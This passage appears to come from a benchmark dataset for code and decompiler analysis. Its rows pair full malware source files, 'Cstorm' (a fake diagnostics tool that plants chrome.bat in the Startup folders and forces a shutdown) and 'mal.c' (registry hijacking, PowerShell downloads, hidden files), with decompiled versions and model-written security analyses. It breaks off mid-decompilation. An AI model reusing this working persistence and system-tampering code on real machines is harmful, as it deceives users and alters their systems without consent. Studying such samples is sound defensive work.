5. Flow of execution for the main loop:
   
   - Display the prompt for text input
   - Read text input from the standard input
   - Send the received text input to the connected client
   - Receive a response from the client
   - Display the client's message
   - This loop continues indefinitely, repeating these steps for each iteration.

6. External libraries or dependencies:
   
   The code seems to rely on the following libraries:
   - Standard I/O Library (for `printf()` function and `___stack_chk_guard` symbol)
   - Socket Library (for networking functions like `socket()`, `bind()`, etc.)
   - Standard Library (implicitly, for `undefined` types)

7. Evident security concerns:

   - There is no boundary checking for the input read into `auStack_7d8` which could lead to buffer overflow vulnerabilities.
   - The server does not handle or check return values for errors that could lead the server to crash or behave unpredictably.
   - The server runs an infinite loop with no termination condition, which could be a resource exhaust.
   - The `___stack_chk_guard` usage implies stack protection is enabled, but if not properly checked, buffer overflows could still potentially exploit this.
   - The connection is not encrypted; data is sent in plain text, which could be intercepted and read by third parties.
   - There is no authentication mechanism to verify the identity of the client.
   - The hardcoded port is visible in clear text (0x232a, which is 9002 in hexadecimal), which could make it easier for potential attackers to target the service.","1. The primary functionality of the code is to set up a simple TCP server that listens on port 8994, accepts incoming connections, then enters a loop where it reads a string from standard input, sends it to the client, receives a response, and prints it to the console.

2. Three key functions:
   - `main`: This is where the logic of the server is implemented. It sets up a socket, binds to an address, listens for connections, and then handles incoming data in a loop.
   - `_do_global_dtors_aux`: A function normally used to run destructors for objects with static storage duration. Here, it checks a flag (`_bss_start`) and possibly calls functions to clean up.
   - `__libc_start_main`: Called within `start`, it's the standard C library function that initializes the program and calls the `main` function.

3. The variable `buf` is an array that serves as a buffer to store strings read from standard input before they are sent to the client via the `send` function in the `main` function.

4. The error handling mechanism is rudimentary. The code lacks proper checks after operations like `socket`, `bind`, `listen`, `accept`, `recv`, and `send`. On failure, these functions would return an error code, which the code does not handle. The `abort` function is only called unconditionally after `__libc_start_main` in the `start` function, which is not a typical error handling strategy.

5. Flow of execution in `main`:
   - Initializes a socket.
   - Constructs a `sockaddr` structure with the desired port number.
   - Binds the socket to an address.
   - Listens for incoming connections.
   - Enters a loop to receive and send messages to a client.

6. The code uses standard C library functions like `socket`, `bind`, `accept`, `send`, `recv`, `printf`, and `__libc_start_main`. It depends on these libraries for networking and input/output operations.

7. Evident security concerns:
   - No input validation, allowing for potential buffer overflows especially with `__isoc99_scanf` which is used unsafely.
   - The use of a fixed-size buffer `buf` may lead to stack-based buffer overflow.
   - No error checking after network operations, leaving the program vulnerable to unexpected behavior and potential denial of service.
   - The accepting socket does not limit the incoming connection source, leading to potential unauthorized access."
13,https://github.com/Anish-M-code/Cstorm-windows-startup-virus-in-c/blob/master/Source%20Code/cstorm.c,Done,Linux,"// Cstorm
// Copyright (C) 2018-2019 M.Anish mailto:aneesh25861@gmail.com
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
//(at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program. If not, see http://www.gnu.org/licenses/.
/* Cstorm is a rewrite of PYIRUS , a startup trojan python script to C programming language.
Both these projects were developed independantly by M.Anish only. For Educational purpose only!
USE AT YOUR OWN RISK. DEVELOPER NOT RESPONSIBLE FOR ANY DAMAGES THROUGH USE OF THIS SOFTWARE.	*/
#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<ctype.h>
//Function to get Current User in Windows who is logged in.
void tunnel()
{
system(""echo %USERPROFILE%>user"");
}
//Function to place chrome.bat in startup folder in windows.
void tscan()
{
FILE *f,*fp;
char s[800],ch; int i=0;
f=fopen(""user"",""r"");
if(f==NULL)
{
exit(0);
}
while(feof(f)==0)
{
fscanf(f,""%c"",&ch);
if(ch=='\n')
break;
s[i]=ch;
i++;
}
s[i]='\0';
fclose(f);
strcat(s,""\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\chrome.bat"");
fp=fopen(s,""w"");
//Try to detect if enough permissions are available or not. Attempt without admin access warn user if admin access required.
if(fp==NULL)
{
f=fopen(""C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\chrome.bat"",""w"");
if(f==NULL)
{
system(""cls"");
remove(""user"");
printf(""\nPlease Run this Program as ADMINISTRATOR to continue...\n"");
system(""timeout 10"");
exit(0);
}
fprintf(f,""\necho off\necho Your Computer has been Hacked!\npause""); // String with commands to be executed by cmd.exe
fclose(f);
system(""shutdown /f /t 005 /s /c \""We have to restart the PC to fix detected problems.\"""");
exit(0);
}
fprintf(fp,""\necho off\necho Your Computer Has Been Hacked!\npause"");// String with commands to be executed by cmd.exe
fclose(fp);
}
//Perform some cleaning to avoid detection.
void ok()
{
remove(""user"");
}
//Load all reqired functions.
void run()
{
tunnel();
tscan();
}
//Function to pause the program.
void pause()
{
printf(""\n"");
system(""pause"");
}
int main()
{
// Try a bit of social engineering to convince user something is wrong in their PC.
system(""title System Diagonistics Tool "");
run();
ok();
printf(""\n|----- System Diagonists -----|\n"");
printf(""\n Checking PC for problems...\n"");
system(""systeminfo"");
//Force shuting down PC so that Malware ( chrome.bat ) will be executed on system startup.
system(""shutdown /f /t 005 /s /c \""We have to shutdown the PC to fix detected problems.\"""");
pause();
}","{
""functions"": [
""tunnel"",
""tscan"",
""ok"",
""run"",
""pause"",
""main""
]
}","{
""variables"": [
""s"",
""ch"",
""f"",
""fp"",
""i""
]
}","// Cstorm
// Copyright (C) 2018-2019 M.Anish mailto:aneesh25861@gmail.com
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program. If not, see http://www.gnu.org/licenses/.
/* Cstorm is a rewrite of PYIRUS , a startup trojan python script to C programming language.
Both these projects were developed independently by M.Anish only. For Educational purpose only!
USE AT YOUR OWN RISK. DEVELOPER NOT RESPONSIBLE FOR ANY DAMAGES THROUGH USE OF THIS SOFTWARE. */
// Function to get Current User in Windows who is logged in.
// Function to place chrome.bat in the startup folder in windows.
// Try to detect if enough permissions are available or not. Attempt without admin access warn user if admin access required.
// Perform some cleaning to avoid detection.
// Load all required functions.
// Function to pause the program.","int ok(void);
int remove(char *__filename);
int pause(void);
int system(char *__command);
int puts(char *__s);
void run(void);
int tunnel(void);
void tscan(void);
void exit(int __status);
int feof(FILE *__stream);
undefined8 main(void)
{
system(""title System Diagonistics Tool "");
run();
ok();
puts(""\n|----- System Diagonists -----|"");
puts(""\n Checking PC for problems..."");
system(""systeminfo"");
system(""shutdown /f /t 005 /s /c \""We have to shutdown the PC to fix detected problems.\"""");
pause();
return 0;
}

void tscan(void)
{
int iVar1;
size_t sVar2;
char local_33d;
int local_33c;
FILE *local_338;
FILE *local_330;
undefined8 auStack_328 [7];
undefined8 auStack_2ee [92];
long local_8;
local_8 = ___stack_chk_guard;
local_33c = 0;
local_338 = fopen(""user"",""r"");
if (local_338 == (FILE )0x0) {
/ WARNING: Subroutine does not return */
exit(0);
}
while ((iVar1 = feof(local_338), iVar1 == 0 &&
(__isoc99_fscanf(local_338,&DAT_00100e70,&local_33d), local_33d != '\n'))) {
*(char *)((long)auStack_328 + (long)local_33c) = local_33d;
local_33c = local_33c + 1;
}
*(undefined *)((long)auStack_328 + (long)local_33c) = 0;
fclose(local_338);
sVar2 = strlen((char *)auStack_328);
*(undefined8 *)((long)auStack_328 + sVar2 + 8) = 0x676e696d616f525c;
*(undefined8 *)((long)auStack_328 + sVar2) = 0x617461447070415c;
*(undefined8 *)((long)auStack_328 + sVar2 + 0x18) = 0x6f646e69575c7466;
*(undefined8 *)((long)auStack_328 + sVar2 + 0x10) = 0x6f736f7263694d5c;
*(undefined8 *)((long)auStack_328 + sVar2 + 0x28) = 0x72505c756e654d20;
*(undefined8 *)((long)auStack_328 + sVar2 + 0x20) = 0x74726174535c7377;
*(undefined8 *)(&stack0xfffffffffffffd10 + sVar2) = 0x635c707574726174;
*(undefined8 *)((long)auStack_328 + sVar2 + 0x30) = 0x535c736d6172676f;
*(undefined8 *)((long)auStack_2ee + sVar2 + 8) = 0x7461622e656d6f;
*(undefined8 *)(&stack0xfffffffffffffd10 + sVar2 + 2) = 0x7268635c70757472;
local_330 = fopen((char *)auStack_328,""w"");
if (local_330 == (FILE *)0x0) {
local_338 = fopen(""C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\chrome.bat""
,""w"");
if (local_338 != (FILE )0x0) {
fwrite(""\necho off\necho Your Computer has been Hacked!\npause"",1,0x33,local_338);
fclose(local_338);
system(""shutdown /f /t 005 /s /c \""We have to restart the PC to fix detected problems.\"""");
/ WARNING: Subroutine does not return /
exit(0);
}
system(""cls"");
remove(""user"");
puts(""\nPlease Run this Program as ADMINISTRATOR to continue..."");
system(""timeout 10"");
/ WARNING: Subroutine does not return /
exit(0);
}
fwrite(""\necho off\necho Your Computer Has Been Hacked!\npause"",1,0x33,local_330);
fclose(local_330);
if (local_8 - ___stack_chk_guard == 0) {
return;
}
/ WARNING: Subroutine does not return */
__stack_chk_fail(&__stack_chk_guard,0,local_8 - ___stack_chk_guard);
}","/* This file was generated by the Hex-Rays decompiler version 8.3.0.230608.
Copyright (c) 2007-2021 Hex-Rays mailto:info@hex-rays.com
Detected compiler: GNU C++
*/
#include <defs.h>
//-------------------------------------------------------------------------
// Function declarations
void *init_proc();
void sub_900();
// size_t strlen(const char *s);
// void __noreturn exit(int status);
// int __fastcall __libc_start_main(int (__fastcall *main)(int, char **, char **), int argc, char **ubp_av, void (*init)(void), void (*fini)(void), void (*rtld_fini)(void), void *stack_end);
// int remove(const char *filename);
// int __fastcall __cxa_finalize(void *);
// int fclose(FILE *stream);
// FILE *fopen(const char *filename, const char *modes);
// __int64 __isoc99_fscanf(_QWORD, const char *, ...); weak
// int system(const char *command);
// __int64 gmon_start(void); weak
// void __noreturn abort(void);
// int feof(FILE *stream);
// int puts(const char *s);
// size_t fwrite(const void *ptr, size_t size, size_t n, FILE *s);
// int putchar(int c);
void __fastcall __noreturn start(void (*rtld_fini)(void), int a2, int a3, int a4, int a5, int a6, int a7, int a8, int argc, char *ubp_av); // idb
void *call_weak_fn();
char *deregister_tm_clones();
char *register_tm_clones();
__int64 _do_global_dtors_aux();
__int64 tunnel();
void *tscan();
__int64 ok();
void *run();
__int64 pause();
int __fastcall main(int argc, const char **argv, const char **envp);
void term_proc();
// int __fastcall _cxa_finalize(void *);
// __int64 ITM_deregisterTMCloneTable(void); weak
// __int64 ITM_registerTMCloneTable(void); weak
//-------------------------------------------------------------------------
// Data declarations
void *_dso_handle = &_dso_handle; // weak
char _bss_start; // weak
// extern _UNKNOWN _stack_chk_guard; weak
// extern UNKNOWN gmon_start; weak
//----- (00000000000008E0) ----------------------------------------------------
void *init_proc()
{
return call_weak_fn();
}
//----- (0000000000000900) ----------------------------------------------------
void sub_900()
{
JUMPOUT(0LL);
}
// 910: control flows out of bounds to 0
//----- (0000000000000A40) ----------------------------------------------------
void __fastcall __noreturn start(
void (*rtld_fini)(void),
int a2,
int a3,
int a4,
int a5,
int a6,
int a7,
int a8,
int argc,
char *ubp_av)
{
__libc_start_main((int (fastcall *)(int, char **, char **))main, argc, &ubp_av, 0LL, 0LL, rtld_fini, &argc);
abort();
}
//----- (0000000000000A74) ----------------------------------------------------
void *call_weak_fn()
{
void *result; // x0
result = &gmon_start;
if ( &gmon_start )
return (void *)gmon_start();
return result;
}
// 9C0: using guessed type __int64 gmon_start(void);
//----- (0000000000000A90) ----------------------------------------------------
char *deregister_tm_clones()
{
return &_bss_start;
}
// 12010: using guessed type char _bss_start;
// 120E8: using guessed type __int64 ITM_deregisterTMCloneTable(void);
//----- (0000000000000AC0) ----------------------------------------------------
char *register_tm_clones()
{
return &_bss_start;
}
// 12010: using guessed type char _bss_start;
// 120F8: using guessed type __int64 ITM_registerTMCloneTable(void);
//----- (0000000000000B00) ----------------------------------------------------
__int64 _do_global_dtors_aux()
{
__int64 result; // x0
result = (unsigned __int8)_bss_start;
if ( !_bss_start )
{
if ( &_cxa_finalize )
__cxa_finalize(_dso_handle);
deregister_tm_clones();
result = 1LL;
_bss_start = 1;
}
return result;
}
// 12008: using guessed type void *_dso_handle;
// 12010: using guessed type char _bss_start;
//----- (0000000000000B54) ----------------------------------------------------
__int64 tunnel()
{
return system(""echo %USERPROFILE%>user"");
}
//----- (0000000000000B74) ----------------------------------------------------
void *tscan()
{
char v1; // [xsp+13h] [xbp+13h] BYREF
int v2; // [xsp+14h] [xbp+14h]
FILE *stream; // [xsp+18h] [xbp+18h]
FILE *v4; // [xsp+20h] [xbp+20h]
char s[800]; // [xsp+28h] [xbp+28h] BYREF
v2 = 0;
stream = fopen(""user"", ""r"");
if ( !stream )
exit(0);
while ( !feof(stream) )
{
__isoc99_fscanf(stream, ""%c"", &v1);
if ( v1 == 10 )
break;
s[v2++] = v1;
}
s[v2] = 0;
fclose(stream);
strcpy(&s[strlen(s)], ""\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\chrome.bat"");
v4 = fopen(s, ""w"");
if ( !v4 )
{
stream = fopen(""C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\chrome.bat"", ""w"");
if ( !stream )
{
system(""cls"");
remove(""user"");
puts(""\nPlease Run this Program as ADMINISTRATOR to continue..."");
system(""timeout 10"");
exit(0);
}
fwrite(""\necho off\necho Your Computer has been Hacked!\npause"", 1uLL, 0x33uLL, stream);
fclose(stream);
system(""shutdown /f /t 005 /s /c \""We have to restart the PC to fix detected problems.\"""");
exit(0);
}
fwrite(""\necho off\necho Your Computer Has Been Hacked!\npause"", 1uLL, 0x33uLL, v4);
fclose(v4);
return &_stack_chk_guard;
}
// 990: using guessed type __int64 __isoc99_fscanf(_QWORD, const char *, ...);
// B74: using guessed type char s[800];
//----- (0000000000000D6C) ----------------------------------------------------
__int64 ok()
{
return remove(""user"");
}
//----- (0000000000000D8C) ----------------------------------------------------
void *run()
{
tunnel();
return tscan();
}
//----- (0000000000000DA8) ----------------------------------------------------
__int64 pause()
{
putchar(10);
return system(""pause"");
}
//----- (0000000000000DD0) ----------------------------------------------------
int __fastcall main(int argc, const char **argv, const char **envp)
{
system(""title System Diagonistics Tool "");
run();
ok();
puts(""\n|----- System Diagonists -----|"");
puts(""\n Checking PC for problems..."");
system(""systeminfo"");
system(""shutdown /f /t 005 /s /c \""We have to shutdown the PC to fix detected problems.\"""");
pause();
return 0;
}
//----- (0000000000000E2C) ----------------------------------------------------
void term_proc()
{
;
}
// nfuncs=47 queued=14 decompiled=14 lumina nreq=0 worse=0 better=0
// ALL OK, 14 function(s) have been successfully decompiled","1. Primary functionality:
The code masquerades as a system diagnostics tool, attempting to deceive the user into running it with administrator privileges. Its primary function is to create a rogue batch file (`chrome.bat`) that displays a hacking message and place it in the Windows startup folder for execution on every system startup.

2. Key functions:
- `tunnel()`: Retrieves the current Windows user profile path and writes it to a temporary file named ""user"".
- `tscan()`: Constructs the path for the startup folder and attempts to write the rogue `chrome.bat` file there. Falls back to a global startup folder if the first attempt fails, suggesting the need for administrator privileges if both fail.
- `ok()`: Performs cleanup by removing the temporary ""user"" file to reduce traces of the program's execution.

3. Variable role:
- `s`: `s` is a character array used to store the path to the user's startup folder. It's filled by reading data from the file created by `tunnel()`, and later expanded with the path to the intended location of `chrome.bat`.

4. Error handling mechanism:
Error handling in this code is minimal. It checks whether file operations fail (e.g., opening or writing to a file) and if they do, it either attempts an alternative action or exits the program. There is also a check to verify if the program is running with administrator privileges, and a message prompting for elevation if necessary.

5. Flow of execution (tscan function):
- Opens and reads the ""user"" file to find the user profile path.
- Appends the path for the startup directory and the `chrome.bat` filename to `s`.
- Attempts to open and write to that location.
- If unsuccessful, attempts the global startup location.
- Writes commands into `chrome.bat`, closes the file, and issues a system shutdown command.

6. External libraries or dependencies:
The program relies on standard C libraries such as `<stdio.h>`, `<stdlib.h>`, `<string.h>`, and `<ctype.h>`. These provide functionality for file I/O, string manipulation, and system calls.

7. Security concerns:
- The code can be classified as malicious, as it performs unauthorized actions indicative of malware, such as deceptive messaging and placing unauthorized files to run on startup.
- It lacks user consent and transparency, presents false information, and can potentially be used for harmful purposes.
- The use of `system()` calls can be insecure and lead to arbitrary code execution if input is not properly sanitized.","1. The primary functionality of this code seems to be to masquerade as a ""System Diagnostics Tool"" while performing malicious activities like creating a persistent backdoor through a batch file and shutting down the system under the guise of fixing detected problems.

2. Key Functions:
   - `system(char *__command)`: Executes a system command as if typed directly into the command line. Used here to show system info, shut down the computer, and manipulate files.
   - `fopen(char *__filename, char *__modes)`: Opens a file with specified mode (read/write). Used to manipulate stealth batch files.
   - `fwrite(const void *__ptr, size_t __size, size_t __nmemb, FILE *__stream)`: Writes data to a file, used here to write the malicious batch script.

3. The `local_338` variable is a file pointer used to open and interact with files. In `tscan`, it's used to open a file named ""user"" and later to create a ""chrome.bat"" batch file in the system's ""Start Menu"" directory.

4. The error handling mechanism is basic and abrupt. The code uses the `exit(int __status)` function to terminate the program immediately with no cleanup or detailed error messages if certain conditions are not met, such as failing to open a file or detect a stack buffer overflow.

5. The flow of execution in `tscan` involves trying to open a file named ""user"". If it fails, the program exits. Otherwise, it reads from the file, constructs a file path for a batch file, and writes to it. If writing to the batch file fails, it tries to create it in another location.

6. The code likely relies on several standard C libraries, although they are not included in the snippet provided. These would typically include:
   - `stdio.h` for file operations (`fopen`, `fclose`, `fwrite`, etc.)
   - `stdlib.h` for the `exit` function
   - `string.h` for string operations like `strlen`

7. Evident security concerns include:
   - The crafted batch file indicates a potentially malicious intent to mislead the user into believing their computer has been hacked.
   - Abrupt termination with `exit(0)` may leave the system in an unstable state.
   - Use of a hardcoded file path suggests an attempt to establish persistence without user consent.
   - The program attempts to hide its malicious activity behind seemingly benign system commands (`systeminfo`, `shutdown`).
   - There are potential buffer overflows, as arbitrary data is written to a stack buffer (`auStack_328` and `auStack_2ee`) without bounds checking.","1. **Primary Functionality:**
The code appears to be part of a malicious program that creates a batch file in the start-up folder, feigning a system diagnosis while echoing a hacked message, and then forces the computer to shut down.

2. **Three Key Functions:**
   - `tunnel()`: Executes a command to print the user's profile directory to a file named ""user"".
   - `tscan()`: Reads the ""user"" file to construct a path to the startup folder and creates a batch file there with a fake hack message.
   - `main()`: Presents the program as a system diagnostic tool, executes `run()` and `ok()` functions, and eventually initiates a shutdown sequence.

3. **Role of a Variable:**
   - `s` (in `tscan`): This character array is used to construct the file path for the batch file that is created in the startup folder.

4. **Error Handling Mechanism:**
The program checks whether file operations are successful (such as the `fopen` result). On failure, it either exits or tries an alternative path. `system` calls indicate an assumption of success without checking the returned status.

5. **Flow of Execution in a Specific Section (tscan):**
   - Open ""user"", exit if fail.
   - Read character by character until newline or EOF.
   - Construct path for batch file.
   - Attempt to write to batch file, exit on failure.
   - Write a fake hack message to the file.

6. **External Libraries or Dependencies:**
   - Standard C library functions (`fopen`, `fclose`, `remove`, `system`, etc.) are used, suggesting a need for a C standard library implementation like `glibc`.
   - Additionally, functions such as `__isoc99_fscanf` indicate a dependency on the GNU C Library (glibc) for conforming to the ISO C99 standard.

7. **Evident Security Concerns:**
   - The program writes unauthorized batch scripts into the startup folder, suggesting malware behavior.
   - Use of `system` calls can expose the program to command injection vulnerabilities.
   - No validation of data read from a file could lead to buffer overflows or unexpected behavior.

Note: As this appears to be an analysis of decompiled malicious software, this explanation is for educational purposes only. Understanding and defending against such software is important for cybersecurity."
14,https://github.com/shanekalewis/MalwareSampleCode/blob/master/Code/mal.c,Done,Windows,"#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
int onlineVersion(){
FILE * fp;
//Create and open batch file to insert registry commands
fp = fopen(""mal.bat"", ""w+"");
//Test for file
if (fp == NULL) {
printf(""womp\n"");
printf(""%s"",strerror(errno));
exit(EXIT_FAILURE);
} else {
//Command to enable multiple line input
fprintf(fp, ""setlocal enabledelayedexpansion \n"");
//Create command line variables for links
fprintf(fp, ""set iconLink=http://www.iconarchive.com/download/i108459/google/noto-emoji-people-bodyparts/11947-middle-finger-light-skin-tone.ico \n"");
fprintf(fp, ""set imageLink=http://icons.iconarchive.com/icons/google/noto-emoji-people-bodyparts/1024/11947-middle-finger-light-skin-tone-icon.png \n"");
//Start powershell to retrieve images from the internet
fprintf(fp, ""start powershell curl \""%%iconLink%% -o malIcon.ico\"" \n"");
fprintf(fp, ""start powershell curl \""%%imageLink%% -o malImage.png\"" \n"");
//Create command line variables for the path to retrieved images
fprintf(fp, ""set \""targ1=%%cd%%\\malIcon.ico\"" \n"");
fprintf(fp, ""set \""targ2=%%cd%%\\malImage.png\"" \n"");
//Registry commands -- Create new key for Shell Icons
fprintf(fp, ""REG ADD \""HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Icons\"" /v /f \n"");
//Registry commands -- Set default folder value to image path
fprintf(fp, ""REG ADD \""HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Icons\"" /v \""3\"" /t REG_EXPAND_SZ /d %%targ1%% /f \n"");
fprintf(fp, ""REG ADD \""HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Icons\"" /v \""4\"" /t REG_EXPAND_SZ /d %%targ1%% /f \n"");
//Registry commands -- change wallpaper values to image path
fprintf(fp, ""REG ADD \""HKEY_CURRENT_USER\\Control Panel\\Desktop\"" /v Wallpaper /t REG_SZ /d %%targ2%% /f \n"");
fprintf(fp, ""REG ADD \""HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\Desktop\\General\"" /v Wallpaper /t REG_SZ /d %%targ2%% /f \n"");
//command to load updated registry values into the system
fprintf(fp, ""RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters"");
}
//close file
fclose(fp);
//start the created scipt
system(""start mal.bat"");
//Hide the images and malicious program
system(""attrib +h malIcon.ico"");
system(""attrib +h malImage.ico"");
system(""attrib +h malProg.exe"");
//Delete the batch script
system(""del mal.bat"");
return 0;
}
int offlineVersion(){
FILE * fp;
//Create and open bat file to insert regsitry commands
fp = fopen(""mal.bat"", ""w+"");
//Test for file
if (fp == NULL) {
printf(""womp\n"");
printf(""%s"", strerror(errno));
exit(EXIT_FAILURE);
} else {
//Registry commands -- change wallpaper
fprintf(fp, ""REG ADD \""HKEY_CURRENT_USER\\Control Panel\\Desktop\"" /v Wallpaper /t REG_SZ /d \""255 247 8\"" /f \n"");
fprintf(fp, ""REG ADD \""HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\Desktop\\General\"" /v Wallpaper /t REG_SZ /d \""255 247 8\"" /f \n"");
//Registry commands -- Create new key for Shell Icons
fprintf(fp, ""REG ADD \""HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Icons\"" /v /f \n"");
//Registry commands -- changes default icons for folders
fprintf(fp, ""REG ADD \""HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Icons\"" /v \""3\"" /t REG_EXPAND_SZ /d C:\\Windows\\system32\\imageres.dll,28 /f \n"");
fprintf(fp, ""REG ADD \""HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Icons\"" /v \""4\"" /t REG_EXPAND_SZ /d C:\\Windows\\system32\\imageres.dll,28 /f \n"");
//Command to load updated registry values into the system
fprintf(fp, ""RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters"");
//close file
fclose(fp);
//start the file just created
system(""start mal.bat"");
Sleep(1000);
//delete the file to limit presence
system(""del mal.bat"");
return 0;
}
}
int main() {
//Variables to get windows version
DWORD dwVersion = 0;
DWORD dwMajorVersion = 0;
DWORD dwMinorVersion = 0;
//function to get windows version
dwVersion = GetVersion();
//More specific windows version using conversion
dwMajorVersion = (DWORD)(LOBYTE(LOWORD(dwVersion)));
dwMinorVersion = (DWORD)(HIBYTE(LOWORD(dwVersion)));
//Test for windows 8 or above
if ((dwMajorVersion >= 6) & (dwMinorVersion >= 2)){
//Test for internet connection using ping
if (system(""ping 45.33.40.23 -c 1"")) {
offlineVersion();
} else {
onlineVersion();
}
} else {
offlineVersion();
}
return 0;
}","{
""functions"": [
""onlineVersion"",
""offlineVersion"",
""main""
]
}","{
""variables"": [
""fp"",
""dwVersion"",
""dwMajorVersion"",
""dwMinorVersion""
]
}","//Create and open batch file to insert registry commands
//Test for file
//Command to enable multiple line input
//Create command line variables for links
//Start powershell to retrieve images from the internet
//Create command line variables for the path to retrieved images
//Registry commands -- Create new key for Shell Icons
//Registry commands -- Set default folder value to image path
//Registry commands -- change wallpaper values to image path
//command to load updated registry values into the system
//close file
//start the created script
//Hide the images and malicious program
//Delete the batch script
//Create and open batch file to insert registry commands
//Test for file
//Registry commands -- change wallpaper
//Registry commands -- Create new key for Shell Icons
//Registry commands -- changes default icons for folders
//Command to load updated registry values into the system
//close file
//start the file just created
//delete the file to limit presence
//Variables to get windows version
//function to get windows version
//More specific windows version using conversion
//Test for windows 8 or above
//Test for internet connection using ping","int __cdecl _main(int _Argc,char **_Argv,char **_Env);
DWORD _GetVersion@0(void);
undefined4 _onlineVersion(void);
char * __cdecl _strerror(int param_1);
int __cdecl _system(char *_Command);
void __cdecl _exit(int _Code);
int __cdecl _puts(char *_Str);
undefined4 _offlineVersion(void);
void _Sleep@4(DWORD dwMilliseconds);
int __cdecl _main(int _Argc,char **_Argv,char **_Env)
{
DWORD DVar1;
int iVar2;
___main();
DVar1 = _GetVersion_0();
if ((DVar1 >> 8 & 0xff) < 2 || (DVar1 & 0xff) < 6) {
_offlineVersion();
}
else {
iVar2 = _system(""ping 45.33.40.23 -c 1"");
if (iVar2 == 0) {
_onlineVersion();
}
else {
_offlineVersion();
}
}
return 0;
}

undefined4 _onlineVersion(void)
{
FILE *_File;
int *piVar1;
char *pcVar2;
_File = _fopen(""mal.bat"",""w+"");
if (_File == (FILE *)0x0) {
_puts(""womp"");
piVar1 = __errno();
pcVar2 = _strerror(piVar1);
_printf(""%s"",pcVar2);
/ WARNING: Subroutine does not return */
_exit(1);
}
_fwrite(""setlocal enabledelayedexpansion \n"",1,0x21,_File);
_fwrite(""set iconLink=http://www.iconarchive.com/download/i108459/google/noto-emoji-people-bodyparts/11947-middle-finger-light-skin-tone.ico \n""
,1,0x85,_File);
_fwrite(""set imageLink=http://icons.iconarchive.com/icons/google/noto-emoji-people-bodyparts/1024/11947-middle-finger-light-skin-tone-icon.png \n""
,1,0x87,_File);
_fprintf(_File,""start powershell curl \""%%iconLink%% -o malIcon.ico\"" \n"");
_fprintf(_File,""start powershell curl \""%%imageLink%% -o malImage.png\"" \n"");
_fprintf(_File,""set \""targ1=%%cd%%\\malIcon.ico\"" \n"");
_fprintf(_File,""set \""targ2=%%cd%%\\malImage.png\"" \n"");
_fwrite(""REG ADD \""HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Icons\"" /v /f \n""
,1,99,_File);
_fprintf(_File,
""REG ADD \""HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Icons\"" /v \""3\"" /t REG_EXPAND_SZ /d %%targ1%% /f \n""
);
_fprintf(_File,
""REG ADD \""HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Icons\"" /v \""4\"" /t REG_EXPAND_SZ /d %%targ1%% /f \n""
);
_fprintf(_File,
""REG ADD \""HKEY_CURRENT_USER\\Control Panel\\Desktop\"" /v Wallpaper /t REG_SZ /d %%targ2%% /f \n""
);
_fprintf(_File,
""REG ADD \""HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\Desktop\\General\"" /v Wallpaper /t REG_SZ /d %%targ2%% /f \n""
);
_fwrite(""RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters"",1,0x35,_File);
_fclose(_File);
_system(""start mal.bat"");
_system(""attrib +h malIcon.ico"");
_system(""attrib +h malImage.ico"");
_system(""attrib +h malProg.exe"");
_system(""del mal.bat"");
return 0;
}

undefined4 _offlineVersion(void)
{
FILE *_File;
int *piVar1;
char *pcVar2;
_File = _fopen(""mal.bat"",""w+"");
if (_File == (FILE *)0x0) {
_puts(""womp"");
piVar1 = __errno();
pcVar2 = _strerror(piVar1);
_printf(""%s"",pcVar2);
/ WARNING: Subroutine does not return */
_exit(1);
}
_fwrite(""REG ADD \""HKEY_CURRENT_USER\\Control Panel\\Desktop\"" /v Wallpaper /t REG_SZ /d \""255 247 8\"" /f \n""
,1,0x5c,_File);
_fwrite(""REG ADD \""HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\Desktop\\General\"" /v Wallpaper /t REG_SZ /d \""255 247 8\"" /f \n""
,1,0x7b,_File);
_fwrite(""REG ADD \""HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Icons\"" /v /f \n""
,1,99,_File);
